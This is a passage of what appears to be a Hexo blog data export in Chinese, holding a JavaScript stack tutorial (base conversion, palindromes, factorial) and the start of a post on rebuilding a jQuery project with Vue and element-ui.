(s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    converted += DIGITS[s.pop()];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> converted;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">2</span>)); <span class=\"comment\">// 11000011111111001</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">8</span>)); <span class=\"comment\">// 303771</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">16</span>)); <span class=\"comment\">// 187F9</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">5</span>, <span class=\"number\">2</span>)); <span class=\"comment\">// 101</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"回文判断\"><a href=\"#回文判断\" class=\"headerlink\" title=\"回文判断\"></a>回文判断</h2><p>回文是指这样一种现象：一个单词、短语或数字，从前往后写和从后往前写都是一样的。例如，“dad”、“racecar”、1001。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断给定字符串是否是回文</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isPalindrome</span>(<span class=\"params\">word</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; word.length; i++) &#123;</span><br><span class=\"line\">    s.push(word[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rword = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    rword += s.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> word === rword;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 实现二</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isPalindrome2</span>(<span class=\"params\">word</span>) </span>&#123;</span><br><span class=\"line\">  word = word + <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    word ===</span><br><span class=\"line\">    word</span><br><span class=\"line\">      .split(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">      .reverse()</span><br><span class=\"line\">      .join(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"hello: \"</span> + isPalindrome(<span class=\"string\">\"hello\"</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"racecar: \"</span> + isPalindrome(<span class=\"string\">\"racecar\"</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"1001: \"</span> + isPalindrome(<span class=\"number\">1001</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"递归演示\"><a href=\"#递归演示\" class=\"headerlink\" title=\"递归演示\"></a>递归演示</h2><p>下面是一个递归函数，可以计算任何数字的阶乘：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">factorial</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n * factorial(n - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fact</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (n &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    s.push(n--);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> product = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    product *= s.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> product;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"factorial: \"</span> + factorial(<span class=\"number\">5</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"fact: \"</span> + fact(<span class=\"number\">5</span>));</span><br><span class=\"line\"><span class=\"comment\">// factorial: 120</span></span><br><span class=\"line\"><span class=\"comment\">// fact: 120</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"意外收获\"><a href=\"#意外收获\" class=\"headerlink\" title=\"意外收获\"></a>意外收获</h2><ol>\n<li>浮点数怎么转换成二进制，怎么转成任意进制？</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">小数部分计算方法：</span><br><span class=\"line\">乘2取整法，即每一步将十进制小数部分乘以2，所得积的小数点左边的数字（0或1）作为二进制表示法中的数字，直到满足你的精确度为止。</span><br><span class=\"line\">0.874的转换过程（取精度为6位）：</span><br><span class=\"line\">0.874*2＝1.748 小数点左边为 1</span><br><span class=\"line\">0.748*2＝1.496 小数点左边为 1</span><br><span class=\"line\">0.496*2＝0.992 小数点左边为 0</span><br><span class=\"line\">0.992*2＝1.984 小数点左边为 1</span><br><span class=\"line\">0.984*2＝1.968 小数点左边为 1</span><br><span class=\"line\">0.968*2＝1.936 小数点左边为 1</span><br><span class=\"line\">十进制：123.874 二进制：1111011.110111</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>回文古诗验证？</li>\n<li>如下图：<br><img src=\"/数据结构与算法@栈/1.jpg\" alt=\"思维导图\"></li>\n</ol>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/30/data-structures-stack-2\">数据结构——栈（练习题及实现）</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》<br>《学习 JavaScript 数据结构与算法（第 2 版）》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。</p>\n<p>栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作（后<br>面的章节讨论图和回溯问题时，我们会学习如何应用这个例子）。Java 和 C#用栈来存储变量和方<br>法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常。</p>\n<p>最后将学习使用栈的三个最著名的算法示例。首先是十进制转二进制问题，以及任意进制转换的算法；<br>然后是平衡圆括号问题；最后，我们会学习如何用栈解决汉诺塔问题。</p>\n<p>本篇主要讲如何用 JavaScript 描述实现一个栈类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。<br><img src=\"/数据结构与算法@栈/0.svg\" alt=\"思维导图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"栈的实现\"><a href=\"#栈的实现\" class=\"headerlink\" title=\"栈的实现\"></a>栈的实现</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Stack</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.top = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  push(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.top++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pop() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[--<span class=\"keyword\">this</span>.top];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  peek() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.top - <span class=\"number\">1</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.top = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  length() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.top;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">s.push(<span class=\"string\">\"ali\"</span>);</span><br><span class=\"line\">s.push(<span class=\"string\">\"baidu\"</span>);</span><br><span class=\"line\">s.push(<span class=\"string\">\"tengxun\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length()); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> poped = s.pop();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(poped); <span class=\"comment\">// tengxun</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length()); <span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> peeked = s.peek();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"peeked: \"</span> + peeked); <span class=\"comment\">// peeked: baidu</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用-Stack-类\"><a href=\"#使用-Stack-类\" class=\"headerlink\" title=\"使用 Stack 类\"></a>使用 Stack 类</h2><h3 id=\"数制间的相互转换\"><a href=\"#数制间的相互转换\" class=\"headerlink\" title=\"数制间的相互转换\"></a>数制间的相互转换</h3><p>利用栈将一个数字从一种数值转换成另一种数制。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 十进制整数转成任何进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mulBase</span>(<span class=\"params\">num, base</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> DIGITS = <span class=\"string\">\"0123456789ABCDEF\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">    s.push(num % base);</span><br><span class=\"line\">    num = <span class=\"built_in\">Math</span>.floor(num / base);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">while</span> (num &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> converted = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    converted += DIGITS[s.pop()];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> converted;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">2</span>)); <span class=\"comment\">// 11000011111111001</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">8</span>)); <span class=\"comment\">// 303771</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">100345</span>, <span class=\"number\">16</span>)); <span class=\"comment\">// 187F9</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mulBase(<span class=\"number\">5</span>, <span class=\"number\">2</span>)); <span class=\"comment\">// 101</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"回文判断\"><a href=\"#回文判断\" class=\"headerlink\" title=\"回文判断\"></a>回文判断</h2><p>回文是指这样一种现象：一个单词、短语或数字，从前往后写和从后往前写都是一样的。例如，“dad”、“racecar”、1001。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断给定字符串是否是回文</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isPalindrome</span>(<span class=\"params\">word</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; word.length; i++) &#123;</span><br><span class=\"line\">    s.push(word[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rword = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    rword += s.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> word === rword;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 实现二</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isPalindrome2</span>(<span class=\"params\">word</span>) </span>&#123;</span><br><span class=\"line\">  word = word + <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    word ===</span><br><span class=\"line\">    word</span><br><span class=\"line\">      .split(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">      .reverse()</span><br><span class=\"line\">      .join(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"hello: \"</span> + isPalindrome(<span class=\"string\">\"hello\"</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"racecar: \"</span> + isPalindrome(<span class=\"string\">\"racecar\"</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"1001: \"</span> + isPalindrome(<span class=\"number\">1001</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"递归演示\"><a href=\"#递归演示\" class=\"headerlink\" title=\"递归演示\"></a>递归演示</h2><p>下面是一个递归函数，可以计算任何数字的阶乘：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">factorial</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n * factorial(n - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fact</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (n &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    s.push(n--);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> product = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (s.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    product *= s.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> product;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"factorial: \"</span> + factorial(<span class=\"number\">5</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"fact: \"</span> + fact(<span class=\"number\">5</span>));</span><br><span class=\"line\"><span class=\"comment\">// factorial: 120</span></span><br><span class=\"line\"><span class=\"comment\">// fact: 120</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"意外收获\"><a href=\"#意外收获\" class=\"headerlink\" title=\"意外收获\"></a>意外收获</h2><ol>\n<li>浮点数怎么转换成二进制，怎么转成任意进制？</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">小数部分计算方法：</span><br><span class=\"line\">乘2取整法，即每一步将十进制小数部分乘以2，所得积的小数点左边的数字（0或1）作为二进制表示法中的数字，直到满足你的精确度为止。</span><br><span class=\"line\">0.874的转换过程（取精度为6位）：</span><br><span class=\"line\">0.874*2＝1.748 小数点左边为 1</span><br><span class=\"line\">0.748*2＝1.496 小数点左边为 1</span><br><span class=\"line\">0.496*2＝0.992 小数点左边为 0</span><br><span class=\"line\">0.992*2＝1.984 小数点左边为 1</span><br><span class=\"line\">0.984*2＝1.968 小数点左边为 1</span><br><span class=\"line\">0.968*2＝1.936 小数点左边为 1</span><br><span class=\"line\">十进制：123.874 二进制：1111011.110111</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>回文古诗验证？</li>\n<li>如下图：<br><img src=\"/数据结构与算法@栈/1.jpg\" alt=\"思维导图\"></li>\n</ol>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/30/data-structures-stack-2\">数据结构——栈（练习题及实现）</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》<br>《学习 JavaScript 数据结构与算法（第 2 版）》</p>"},{"title":"Vue重构jQuery项目经验总结一","date":"2019-08-09T01:28:02.000Z","updated":"2019-08-09T01:28:02.000Z","_content":"\n# 概述\n\n用 Vue 生态重构已有的老项目（jsp+jquery），针对目前实践中遭遇的一些坑，做下小结。具体包括：URL 转换规则、element-ui 自定义校验、`el-table`组件删除问题、自定义组件`v-model`使用和`sync`修饰符。\n\n<!-- more -->\n\n# 详述\n\n初始化项目直接用的 vue-cli，安装全家桶（router、vuex），代码规范选用的 Prettier，配置文件选择放在单独文件，ui 库用 element-ui。\n\n## URL 转换规则\n\n对于资源的引用路径，可以用相对路径，也可以用绝对路径，但是实际中，对于嵌套太深的一般使用绝对路径比较合适。在 vue-cli 初始化的项目中默认设置了`@`别名作为 src 根目录，当然我们也可以在 webpack 配置文件中设置更多的别名。\n\n在 js 中引用资源的相对路径与绝对路径示例如下：\n\n```js\n// 简洁\nimport MainTitle from \"@/components/MainTitle\";\n// 复杂，容易搞错层级\nimport MainTitle from \"../../../components/MainTitle\";\n```\n\n既然使用别名这么方便，那么在 css 中引用图片也这样搞吧:\n\n```scss\n.select-flag {\n  &:before {\n    content: \"\";\n    width: 16px;\n    height: 11px;\n    display: inline-block;\n    margin-right: 5px;\n    font-size: 0;\n    background: url(\"@/assets/milan/common/img/icon/flags.png\") no-repeat;\n  }\n}\n```\n\n结果报错如下：\n\n```\nFailed to compile.\n\n./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true& (./node_modules/css-loader??ref--8-oneOf-1-1!./node_modules/vue-loader/lib/loaders/stylePostLoader.js!./node_modules/postcss-loader/src??ref--8-oneOf-1-2!./node_modules/sass-loader/lib/loader.js??ref--8-oneOf-1-3!./node_modules/cache-loader/dist/cjs.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true&)\nModule not found: Error: Can't resolve './@/assets/milan/common/img/icon/flags.png' in 'H:\\workspace\\vue\\venice\\src\\components\\CountrySelect'\n```\n\n细看这个报错信息，可知 css-loader 编译时没有找到引用的资源。解决方式为：`background: url(\"~@/assets/milan/common/img/icon/flags.png\") no-repeat;`。原因是，`@`与`~`开头都会作为一个模块请求被解析，但是`@`开头仅作用域模板中。详细见[官网](https://cli.vuejs.org/zh/guide/html-and-static-assets.html#url-%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99)。\n\n## element-ui 自定义校验\n\nelement 的表单校验与 ant-d 一样都是用的第三方库[async-validator\n](https://github.com/yiminghe/async-validator/blob/master/README.md)。因为 element-ui 官网这块只是一带而过，详细的还是要查看该集成库的文档。下面以自定义同步校验与异步校验为例：\n\n```js\n  ...\n  data() {\n\n    var phoneRepeat = (rule, value, callback) => {\n      request({\n        url: \"/api/account/phoneRepeat\",\n        method: \"post\",\n        params: { regionId: this.ruleForm.regionId, phone: value }\n      }).then(response => {\n        let result = response.data;\n        if (result.code == \"10002\") {\n          callback(new Error(rule.message));\n        } else {\n          callback();\n        }\n      });\n    };\n    var telNumCn = (rule, value, callback) => {\n      var reg = /^1\\d{10}$/;\n      if (this.ruleForm.regionId === \"China\" && !reg.test(value)) {\n        callback(new Error(rule.message));\n      } else {\n        callback();\n      }\n    };\n\n    return {\n      titleTxt: \"管理子账户 \",\n      titleDesc: \"仅提供业务员身份的子账户，用于管理除资金以外的所有权限。\",\n      ruleForm: {\n        type: \"01\",\n        name: \"\",\n        email: \"\",\n        regionId: \"China\",\n        phone: \"\",\n        password: \"\",\n        repeatpwd: \"\"\n      },\n      rules: {\n        phone: [\n          {\n            required: true,\n            message: \"请输入手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: telNumCn,\n            required: true,\n            message: \"请提供有效的中国大陆手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: phoneRepeat,\n            required: true,\n            message: \"此手机已被作为安全手机使用过，请更换。\",\n            trigger: \"blur\"\n          }\n        ]\n      }\n    };\n  },\n  ...\n```\n\n想着校验函数复用，一开始根据 element 示例，想着用一个高阶函数传入 message 生成 validator 函数。后来发现`rule`参数就是指向我们配置的规则对象，因此直接在 rules 中配置 message 即可，当然也可以增加其他参数供 validator 函数使用。\n\n## `el-table`组件删除问题\n\n问题很小，就是用了官方示例，删除成功，但是不是对应的那一条：\n![效果图](GIF.gif)\n检查代码：\n\n```html\n<el-table\n  :data=\"tableData\"\n  style=\"width: 100%\"\n  :default-sort=\"{prop: 'name', order: 'descending'}\"\n>\n  <el-table-column prop=\"name\" label=\"姓名\" sortable sort-by=\"name\" />\n  <el-table-column prop=\"type\" label=\"类型\" />\n  <el-table-column prop=\"email\" label=\"登录邮箱\" />\n  <el-table-column prop=\"phone\" label=\"安全手机\" />\n  <el-table-column prop=\"time\" label=\"添加时间\" sortable sort-by=\"time\" />\n  <el-table-column label=\"操作\" width=\"100\">\n    <template v-slot=\"scope\">\n      <el-button type=\"text\" @click=\"handleEdit(scope.$index, scope.row)\"\n        >编辑</el-button\n      >\n      <el-button type=\"text\" @click=\"handleDelete(scope.$index, scope.row)\"\n        >删除</el-button\n      >\n    </template>\n  </el-table-column>\n</el-table>\n```\n\n```js\n    handleDelete(index, row) {\n      ...\n      this.tableData.splice(index, 1);\n      ...\n    }\n```\n\n没啥问题啊。唉！最后发现加了默认排序，导致展示的顺序与实际的数据顺序不一致，当然根据索引删除也就对不上号了。因此，有排序的，只能通过唯一性的字段，如id，来进行查询筛选了。\n\n## 自定义组件 